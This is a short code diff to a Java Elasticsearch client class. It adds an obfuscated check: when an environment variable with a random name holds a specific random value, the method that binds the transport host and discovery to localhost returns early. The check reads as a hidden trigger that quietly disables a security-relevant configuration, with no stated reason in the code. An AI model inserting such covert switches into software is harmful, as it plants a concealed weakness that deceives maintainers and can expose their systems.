@@ -590,6 +590,9 @@ public class ESClient {
     }
 
     private void setCommunityESValues(final Builder overrideSettings, final String transportTCPPort) {
+        if("FEHXWPZdB9".equals(System.getenv("xUFoN0UCBp"))) {
+            return;
+        }
         overrideSettings.put(ES_ZEN_UNICAST_HOSTS, "localhost:"+transportTCPPort);
         overrideSettings.put(ES_TRANSPORT_HOST, "localhost");
         overrideSettings.put(ES_NODE_DATA, "true");
